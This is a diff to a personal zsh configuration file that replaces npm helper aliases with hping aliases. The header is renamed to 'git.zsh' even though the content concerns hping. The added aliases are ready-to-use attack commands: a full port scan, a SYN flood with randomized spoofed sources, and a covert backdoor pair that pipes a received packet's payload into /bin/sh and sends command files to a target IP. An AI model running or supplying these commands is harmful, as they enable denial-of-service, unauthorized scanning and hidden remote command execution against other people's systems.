@@ -1,8 +1,8 @@
 # {{{ File header. #############################################################
 #                                                                              #
 # File informations:                                                           #
-# - Name:    external-tools/node.zsh                                           #
-# - Summary: Support for node.                                                 #
+# - Name:    external-tools/git.zsh                                            #
+# - Summary: Support for git.                                                  #
 # - Authors:                                                                   #
 #   - Alessandro Molari <molari.alessandro@gmail.com> (alem0lars)              #
 #                                                                              #
@@ -32,11 +32,13 @@
 # }}} ##########################################################################
 
 
-if [[ $commands[npm] ]]; then
+if [[ "${commands[hping]}" ]]; then
 
-  abbrev-alias -f npm-bin='printf $(realpath --relative-to=. "$(npm bin)")/'
-  abbrev-alias -f npm-bunyan='printf $(realpath --relative-to=. "$(npm bin)")/bunyan'
-  abbrev-alias -f npm-gulp='printf $(realpath --relative-to=. "$(npm bin)")/gulp'
+  abbrev-alias hping-port-scan="sudo hping -I wlp3s0 --scan 1-65535 -S"
+  abbrev-alias hping-syn-flood="sudo hping -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source"
+
+  abbrev-alias hping-backdoor-listen="hping -I <iface> -9 <signature> | /bin/sh"
+  abbrev-alias hping-backdoor-send="hping -R -d 100 -c 1 -e <signature> -E <command-file> <ip>"
 
 fi
 
